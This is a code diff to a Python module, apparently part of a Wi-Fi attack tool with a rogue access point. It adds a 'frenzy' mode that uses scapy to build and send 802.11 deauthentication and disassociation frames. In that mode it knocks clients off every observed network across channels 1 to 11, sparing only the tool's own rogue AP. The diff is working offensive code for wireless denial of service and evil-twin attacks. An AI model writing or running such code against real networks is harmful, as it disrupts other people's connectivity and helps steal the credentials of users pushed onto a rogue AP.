@@ -31,13 +31,20 @@ class Deauth(object):
         self._should_continue = True
         self._non_client_addresses = constants.NON_CLIENT_ADDRESSES
         self._data = data
+        self._is_frenzy = False
+        # when --essid is used we don't have target_ap_bssid
+        if data.target_ap_bssid:
+            # Craft and add deauth/disas packet to broadcast address
+            self.packets_to_send = self._craft_packet(
+                self._data.target_ap_bssid,
+                constants.WIFI_BROADCAST,
+                self._data.target_ap_bssid)
+        else:
+            self._is_frenzy = True
+            self.packets_to_send = []
 
-        # Craft and add deauth/disas packet to broadcast address
-        self.packets_to_send = self._craft_packet(
-            self._data.target_ap_bssid,
-            constants.WIFI_BROADCAST)
-
-    def _craft_packet(self, sender, receiver):
+    @staticmethod
+    def _craft_packet(sender, receiver, bssid):
         """
         Craft a deauthentication and a disassociation packet and add
         them to the list of deauthentication packets
@@ -45,9 +52,11 @@ class Deauth(object):
         :param self: A Deauthentication object
         :param sender: The MAC address of the sender
         :param receiver: The MAC address of the receiver
+        :param bssid: The MAC address of the AccessPoint
         :type self: Deauthentication
         :type sender: string
         :type receiver: string
+        :type bssid: string
         :return: None
         :rtype: None
         """
@@ -59,7 +68,7 @@ class Deauth(object):
                 subtype=12,
                 addr1=receiver,
                 addr2=sender,
-                addr3=self._data.target_ap_bssid) /
+                addr3=bssid) /
             dot11.Dot11Deauth())
 
         disassoc_packet = (
@@ -69,14 +78,15 @@ class Deauth(object):
                 subtype=10,
                 addr1=receiver,
                 addr2=sender,
-                addr3=self._data.target_ap_bssid) /
+                addr3=bssid) /
             dot11.Dot11Disas())
 
         return [disassoc_packet, deauth_packet]
 
     def get_packet(self, packet):
         """
-        Process the Dot11 packets and add any desired clients to observed_clients.
+        Process the Dot11 packets and add any desired clients to
+        observed_clients.
 
         :param self: A Deauthentication object.
         :param packet: A scapy.layers.RadioTap object.
@@ -90,41 +100,64 @@ class Deauth(object):
                  access point as they respond to the access point probes.
         """
 
+        channels = []
         # check if the packet has a dot11 layer
         if packet.haslayer(dot11.Dot11):
             # get the sender and receiver
             receiver = packet.addr1
             sender = packet.addr2
+            if self._is_frenzy:
+                bssid = packet.addr3
+                # obtain the channel for this frame
+                try:
+                    # channel is in the third IE of Dot11Elt
+                    channel = ord(packet[dot11.Dot11Elt][2].info)
+                    channels.append(str(channel))
+                except (TypeError, IndexError):
+                    # just return empty channel and packet
+                    return (channels, self.packets_to_send)
+
+                # Do not send deauth for out rogue AP
+                if bssid == self._data.rogue_ap_mac:
+                    return (channels, self.packets_to_send)
+            else:
+                bssid = self._data.target_ap_bssid
+                channels.append(self._data.target_ap_channel)
 
             # create a list of addresses that are not acceptable
-            non_valid_list = self._non_client_addresses + self._observed_clients
+            non_valid_list = self._non_client_addresses +\
+            self._observed_clients
 
             # if sender or receirver is valid and not already a
             # discovered client check to see if either one is a client
             if receiver not in non_valid_list and sender not in non_valid_list:
+
                 # in case the receiver is the access point
-                if receiver == self._data.target_ap_bssid:
+                if receiver == bssid:
                     # add the sender to the client list
                     self._observed_clients.append(sender)
 
                     # create and add deauthentication packets for client
-                    self.packets_to_send += self._craft_packet(
-                        sender, self._data.target_ap_bssid)
-                    self.packets_to_send += self._craft_packet(
-                        self._data.target_ap_bssid, sender)
+                    self.packets_to_send += self._craft_packet(sender,
+                                                               receiver,
+                                                               bssid)
+                    self.packets_to_send += self._craft_packet(receiver,
+                                                               sender,
+                                                               bssid)
 
                 # in case the sender is the access point
-                elif sender == self._data.target_ap_bssid:
+                elif sender == bssid:
                     # add the receiver to the client list
                     self._observed_clients.append(receiver)
 
                     # create and add deauthentication packets for client
-                    self.packets_to_send += self._craft_packet(
-                        receiver, self._data.target_ap_bssid)
-                    self.packets_to_send += self._craft_packet(
-                        self._data.target_ap_bssid, receiver)
-
-        return ([self._data.target_ap_channel], self.packets_to_send)
+                    self.packets_to_send += self._craft_packet(receiver,
+                                                               sender,
+                                                               bssid)
+                    self.packets_to_send += self._craft_packet(sender,
+                                                               receiver,
+                                                               bssid)
+        return (channels, self.packets_to_send)
 
     def send_output(self):
         """
@@ -147,5 +180,6 @@ class Deauth(object):
         :return: A list with all interested channels.
         :rtype: list
         """
-
+        if self._is_frenzy:
+            return [str(k) for k in range(1, 12)]
         return [self._data.target_ap_channel]
